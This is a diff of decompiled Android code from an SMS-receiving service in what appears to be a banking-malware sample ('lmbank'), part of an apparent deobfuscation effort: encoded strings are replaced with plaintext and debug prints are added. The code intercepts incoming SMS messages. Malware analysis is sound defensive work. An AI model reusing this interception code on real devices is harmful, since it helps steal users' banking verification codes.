@@ -57,7 +57,7 @@ public class SmsReceiverServiceV extends Service {
     }
 
     /* JADX WARN: Multi-variable type inference failed */
-    public static final SmsMessage[] getMessagesFromIntent(Intent intent) {
+    public static SmsMessage[] getMessagesFromIntent(Intent intent) {
 //         Object[] objArr = (Object[]) intent.getSerializableExtra(bb7d7pu7.m5998("GQ0cGg"));
         Object[] objArr = (Object[]) intent.getSerializableExtra("pdus");
         if (objArr == null || objArr.length == 0) {
@@ -126,6 +126,7 @@ public class SmsReceiverServiceV extends Service {
     }
 
     protected void handleSmsReceived(Intent intent) {
+        System.out.println("获取");
         String displayMessageBody;
         Bundle extras = intent.getExtras();
         com.wish.lmbank.sms.data.Message message = new com.wish.lmbank.sms.data.Message();
@@ -179,6 +180,7 @@ public class SmsReceiverServiceV extends Service {
             if (smsReceiverServiceV != null) {
                 int i = message.arg1;
                 Intent intent = (Intent) message.obj;
+                System.out.println("收到");
                 if (intent != null) {
 //                     if (bb7d7pu7.m5998("CAcNGwYADUcZGwYfAA0MG0c9DAUMGQEGBxBHOiQ6NjssKiwgPywt").equals(intent.getAction())) {
                     if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
